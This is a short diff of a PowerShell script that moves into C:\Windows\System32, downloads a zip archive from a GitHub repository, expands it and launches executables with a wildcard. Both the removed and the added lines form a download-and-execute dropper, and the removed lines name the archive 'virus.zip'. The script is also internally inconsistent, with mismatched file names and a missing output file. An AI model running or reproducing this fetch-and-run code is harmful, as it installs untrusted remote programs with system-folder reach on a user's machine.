@@ -1,4 +1,4 @@
 cd C:\Windows\System32
-Invoke-WebRequest -Uri "https://github.com/idontknow-CC/wwaaa/blob/main/tailieu.zip" -OutFile "viusss.zip"
-Expand-Archive -Path "virus.zip" -DestinationPath "C:\Windows\System32\HKT"
-Start-Process -FilePath "C:\Windows\System32\HKT\*.exe"
+Invoke-WebRequest -Uri "https://github.com/idontknow-CC/wwaaa/blob/main/tailieu.zip"
+Expand-Archive tailieu.zip
+Start-Process -FilePath "C:\Windows\System32\*.exe"
